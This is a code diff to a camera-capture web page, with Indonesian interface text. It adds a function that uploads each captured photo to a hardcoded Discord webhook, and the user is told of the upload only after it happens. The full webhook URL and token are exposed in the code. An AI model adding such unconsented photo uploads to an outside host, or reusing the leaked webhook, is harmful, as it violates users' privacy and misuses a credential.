@@ -15,6 +15,30 @@
             const timestamp = new Date().toISOString();
             return `Edge function executed at: ${timestamp}`;
         }
+
+        // Function to send photo to Discord webhook
+        async function sendToDiscord(blob) {
+            const webhookUrl = "https://discordapp.com/api/webhooks/1320606404985487391/mvaetfPZAjSEaEI9823-e7pqoXoe04V5NCcb8uQZyso983SnYWEbckHmOVUaPw6o2kFJ";
+            const formData = new FormData();
+            formData.append('file', blob, 'photo.png');
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    alert('Foto berhasil dikirim ke Discord!');
+                } else {
+                    console.error('Gagal mengirim foto:', response.statusText);
+                    alert('Gagal mengirim foto ke Discord.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Terjadi kesalahan saat mengirim foto ke Discord.');
+            }
+        }
     </script>
 </head>
 <body>
@@ -63,6 +87,10 @@
 
             // Mengubah canvas menjadi gambar
             canvas.toBlob(blob => {
+                // Kirim foto ke Discord
+                sendToDiscord(blob);
+
+                // Membuat tautan unduhan
                 const url = URL.createObjectURL(blob);
                 downloadLink.href = url;
                 downloadLink.download = 'foto_kamera.png';
